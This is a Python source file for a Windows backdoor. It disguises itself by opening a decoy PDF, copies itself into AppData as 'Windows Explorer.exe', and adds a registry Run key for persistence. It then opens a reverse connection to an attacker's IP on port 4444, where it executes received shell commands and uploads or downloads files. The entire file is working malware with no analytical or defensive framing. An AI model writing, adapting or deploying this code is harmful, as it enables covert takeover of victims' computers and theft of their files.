#!/usr/bin/env python

from socket import *
import subprocess
import json
import os
import base64
import sys
import shutil


Ip_Adress = "192.168.1.X"
Port = 4444

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket(AF_INET, SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def excute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_direcroty_to(self,path):
        os.chdir(path)
        return "[+] Changing working directory to " + os.getcwd()

    def read_file(self, path):
        with open(path, "rb") as file: # change to rb to r if need!
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file: # change to wb to w if need!
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def run(self):
         while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_direcroty_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1],command[2])
                else:
                    command_result = self.excute_system_command(command)
            except Exception:
                command_result = "[-] Error during command executing"
                    
            self.reliable_send(command_result.decode())

        #connection.close()
        
file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor(Ip_Adress, Port)
    my_backdoor.run()
except Exception:
    sys.exit()
